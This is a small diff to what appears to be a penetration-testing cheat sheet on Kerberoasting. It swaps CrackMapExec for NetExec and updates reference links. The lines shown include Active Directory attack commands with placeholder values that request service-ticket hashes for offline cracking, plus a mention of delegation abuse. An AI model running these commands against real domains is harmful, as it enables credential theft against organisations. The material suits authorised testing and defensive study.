@@ -49,11 +49,11 @@ GetUserSPNs.py -request -dc-ip DC_IP 'DOMAIN/USER_NAME:USER_PASS'
 
 ```
 
-**Method 2:** CrackMapExec
+**Method 2:** NetExec
 
 ```bash
 
-cme ldap DC_IP -u 'USER_NAME' -p 'USER_PASS' --kerberoasting OUT_FILE
+nxc ldap DC_IP -u 'USER_NAME' -p 'USER_PASS' --kerberoasting OUT_FILE
 
 ```
 
@@ -84,6 +84,6 @@ An account with an SPN can write its own `msDS-AllowedToActOnBehalfOfOtherIdenti
 ## References
 
 - impacket - https://github.com/fortra/impacket
-- CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec
+- NetExec - https://github.com/Pennyw0rth/NetExec
 - Hashcat example hashes - https://hashcat.net/wiki/doku.php?id=example_hashes
-- HackTricks - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
+- HackTricks - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html
